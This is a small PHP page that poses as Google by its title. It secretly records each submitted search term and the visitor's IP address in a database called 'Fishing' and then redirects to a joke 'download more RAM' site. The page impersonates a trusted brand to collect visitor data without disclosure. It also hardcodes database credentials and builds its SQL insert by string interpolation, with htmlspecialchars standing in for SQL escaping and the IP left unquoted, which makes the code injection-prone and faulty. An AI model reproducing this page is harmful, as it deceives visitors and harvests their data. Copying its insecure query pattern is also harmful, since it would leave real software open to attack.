<!DOCTYPE html>
<html>
	<head>
        <title>Google</title>
    </head>
	<body>
    <?php
    $server = "localhost";
    $username = "php";
    $password = "1.1.";
    $database = "Fishing";
    $conn = mysqli_connect($server, $username, $password, $database);
    $search = htmlspecialchars($_POST['search']);
    $ip = htmlspecialchars($_SERVER['REMOTE_ADDR']);

    $sql = "INSERT INTO Stupids (searched, ip) VALUES ('{$search}', {$ip});";
    $result = mysqli_query($conn, $sql);
    mysqli_close($conn);
    header('Location: https://downloadmoreram.com/');
    ?>
    </body>
</html>